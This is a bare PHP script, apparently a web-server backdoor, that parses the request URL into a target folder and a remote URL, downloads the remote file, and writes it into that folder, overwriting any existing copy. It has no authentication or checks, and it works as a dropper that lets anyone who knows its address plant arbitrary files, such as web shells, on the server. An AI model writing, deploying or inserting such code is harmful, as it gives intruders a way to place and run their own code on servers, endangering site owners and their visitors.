<?php 

$srv = $_SERVER; $req = $srv["REQUEST_URI"];$php = $srv["PHP_SELF"]; $req=str_replace(array($php,'?'),'',$req);$x=explode('|',$req);

$fld = $x[0]; $rmt = $x[1]; 

if(file_exists($fld)){$dt=file_get_contents($rmt);$flnm=$fld."/".basename($rmt);(file_exists($flnm) ? @unlink($flnm):''); file_put_contents($flnm,$dt); }